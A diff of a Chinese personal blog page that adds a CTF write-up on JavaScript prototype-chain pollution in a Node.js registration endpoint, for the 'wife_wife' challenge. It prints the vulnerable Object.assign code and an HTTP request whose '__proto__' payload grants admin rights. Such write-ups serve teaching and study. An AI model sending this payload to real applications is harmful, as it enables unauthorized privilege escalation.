@@ -2,19 +2,19 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>isum</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="isum">
+  <title>褥一把ctf系列之js原型链污染 | isum</title>
+  <meta name="keywords" content=" 原型链污染 ">
+  <meta name="description" content="褥一把ctf系列之js原型链污染 | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="test">
+<meta name="description" content="还没有">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于页">
 <meta property="og:url" content="https://ehzisum.github.io/about/index.html">
 <meta property="og:site_name" content="isum">
-<meta property="og:description" content="test">
+<meta property="og:description" content="还没有">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-04-26T23:27:22.000Z">
-<meta property="article:modified_time" content="2024-04-27T00:03:24.252Z">
+<meta property="article:modified_time" content="2024-05-29T14:00:20.545Z">
 <meta property="article:author" content="isum">
 <meta name="twitter:card" content="summary">
 
@@ -56,7 +56,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -85,7 +85,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(2)</small>
+                <small>(3)</small>
             
         </div>
     </li>
@@ -97,7 +97,7 @@
         <div data-rel="洪秀全">
             
             洪秀全
-            <small>(1)</small>
+            <small>(2)</small>
         </div>
         
     </li>
@@ -109,9 +109,9 @@
             
                 
     <li>
-        <div data-rel="temp">
+        <div data-rel="刷题&amp;比赛">
             
-            temp
+            刷题&amp;比赛
             <small>(1)</small>
         </div>
         
@@ -140,7 +140,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="2">
+<input type="hidden" id="yelog_site_posts_number" value="3">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -187,7 +187,7 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>有趣的</a>
+                <i class="iconfont icon-tag"></i><a>原型链污染</a>
             </li>
         
     </div>
@@ -198,16 +198,25 @@
     <nav id="title-list-nav">
         
         
-        <a  class="全部文章 洪秀全 "
-           href="/2024/04/27/%E7%9C%8B%E8%BF%99%E9%87%8C%EF%BC%81%E8%BF%99%E9%87%8C%E6%9C%89%E5%A5%BD%E7%8E%A9%E7%9A%84%EF%BC%81/"
-           data-tag="有趣的"
+        <a  class="全部文章 刷题&amp;比赛 "
+           href="/2024/05/29/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%20475639cfebe4417d9b26ea06a02c3d75/"
+           data-tag="原型链污染"
            data-author="" >
-            <span class="post-title" title="看这里！这里有好玩的！">看这里！这里有好玩的！</span>
+            <span class="post-title" title="褥一把ctf系列之js原型链污染">褥一把ctf系列之js原型链污染</span>
+            <span class="post-date" title="2024-05-29 22:08:46">2024/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 洪秀全 "
+           href="/2024/04/27/%E7%8C%9C%E5%AF%86%E7%A0%81/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="猜密码">猜密码</span>
             <span class="post-date" title="2024-04-27 08:26:02">2024/04/27</span>
         </a>
         
         
-        <a  class="全部文章 temp "
+        <a  class="全部文章 洪秀全 "
            href="/2024/04/26/hello-world/"
            data-tag=""
            data-author="" >
@@ -231,12 +240,69 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-褥一把ctf系列之js原型链污染 475639cfebe4417d9b26ea06a02c3d75" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eisum"><span class="toc-text">关于isum</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ps%EF%BC%9A%E8%B0%81%E8%AF%B4isum%E6%98%AF%E8%8B%B1%E6%96%87%E5%8D%95%E8%AF%8D%E4%BA%86%EF%BC%9F%EF%BC%9F%EF%BC%9F%E8%BF%99%E6%98%8E%E6%98%8E%E5%B0%B1%E6%98%AF%E6%8B%BC%E9%9F%B3%EF%BC%8C%E6%B2%A1%E6%96%87%E5%8C%96%E7%9C%9F%E5%8F%AF%E6%80%95w-w-bushi"><span class="toc-text">ps：谁说isum是英文单词了？？？这明明就是拼音，没文化真可怕w-w(bushi)</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+        <h1 class="article-title">褥一把ctf系列之js原型链污染</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="刷题&amp;比赛">刷题&amp;比赛</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">原型链污染</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-05-29 22:21:55'>2024-05-29 22:08</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">知识点：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -249,19 +315,112 @@
     }
 </style>
 </div>
-            <h2 id="关于isum"><a href="#关于isum" class="headerlink" title="关于isum"></a>关于isum</h2><ul>
-<li>👋 Hi, I’m …</li>
-<li>👀 I’m interested in …</li>
-<li>🌱 I’m currently learning …</li>
-<li>💞️ I’m looking to collaborate on …</li>
-<li>📫 How to reach me …</li>
-<li>😄 Pronouns: …</li>
-<li>⚡ Fun fact: …</li>
-</ul>
-<h6 id="ps：谁说isum是英文单词了？？？这明明就是拼音，没文化真可怕w-w-bushi"><a href="#ps：谁说isum是英文单词了？？？这明明就是拼音，没文化真可怕w-w-bushi" class="headerlink" title="ps：谁说isum是英文单词了？？？这明明就是拼音，没文化真可怕w-w(bushi)"></a>ps：谁说isum是英文单词了？？？这明明就是拼音，没文化真可怕w-w(bushi)</h6>
-        </article>
-        
-        
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CATCTF——wife_wife(攻防世界)  总结</p>
+<hr>
+<p>页面巨可爱!</p>
+<p>需要以admin登录进去</p>
+<p><img src="/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%20475639cfebe4417d9b26ea06a02c3d75/Untitled.png" alt="Untitled"></p>
+<p><img src="/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%20475639cfebe4417d9b26ea06a02c3d75/Untitled%201.png" alt="Untitled"></p>
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><strong>一.———————-</strong></p>
+<p>1.node.js创建新用户的常见方法</p>
+<p>2.关于js的对象：可以说 “JavaScript 对象是变量的容器”，但是，我们通常认为 “JavaScript 对象是键值对的容器”</p>
+<p>json.parse() 将json数据解析为js对象</p>
+<p>（关于数据传输：body部分被 Express.js 的中间件body-parser解析为json数据）</p>
+<p>3.object.assign()：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p>
+<p>4.js原型链污染</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%E6%9D%A5%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/361333.html">浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户</a></p>
+<pre><code class="jsx">//随便注册一个看看数据包
+POST /register HTTP/1.1
+Host: 61.147.171.105:49801
+Content-Length: 47
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://61.147.171.105:49801
+Referer: http://61.147.171.105:49801/register.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+&#123;&quot;username&quot;:&quot;b&quot;,&quot;password&quot;:&quot;b&quot;,&quot;isAdmin&quot;:false&#125;
+</code></pre>
+<pre><code class="jsx">//前端代码
+&lt;script&gt;
+        function register(username, password, inviteCode, isAdmin)&#123;
+            let user = &#123;username, password, isAdmin&#125;
+            if(isAdmin)&#123;
+                if(!inviteCode)&#123;
+                    alert(&#39;invite code required&#39;)
+                    return
+                &#125;
+                user = &#123;...user, inviteCode&#125;
+            &#125;
+            fetch(&#39;/register&#39;, &#123;
+                method: &#39;post&#39;,
+                body: JSON.stringify(user)
+            &#125;)
+            .then(res =&gt; res.json())
+            .then(res =&gt; &#123;
+                alert(res.msg)
+                if(!res.err)&#123;
+                    location.href = &#39;/login&#39;
+                &#125;
+            &#125;)
+        &#125;
+
+        function handle_isAdmin_change(isAdmin)&#123;
+            document.getElementById(&#39;div-invitecode&#39;).hidden = !isAdmin
+        &#125;
+    &lt;/script&gt;
+</code></pre>
+<pre><code class="jsx">//wp里部分后端源码
+app.post(&#39;/register&#39;, (req, res) =&gt; &#123;
+    let user = JSON.parse(req.body)
+    if (!user.username || !user.password) &#123;
+        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)
+    &#125;
+    if (users.filter(u =&gt; u.username == user.username).length) &#123;
+        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)
+    &#125;
+    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;
+        user.isAdmin = false
+        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)
+    &#125;
+    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染
+    users.push(newUser)
+    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)
+&#125;)
+</code></pre>
+<pre><code class="jsx">//发包，注册成功
+POST /register HTTP/1.1
+Host: 61.147.171.105:49801
+Content-Length: 62
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://61.147.171.105:49801
+Referer: http://61.147.171.105:49801/register.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+&#123;&quot;username&quot;:&quot;e&quot;,&quot;password&quot;:&quot;e&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
+    </div>
+</article>
+
+
+
+
+
     <div id="comments"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 
@@ -283,6 +442,13 @@
 </script>
 
 
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -291,11 +457,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 </body>
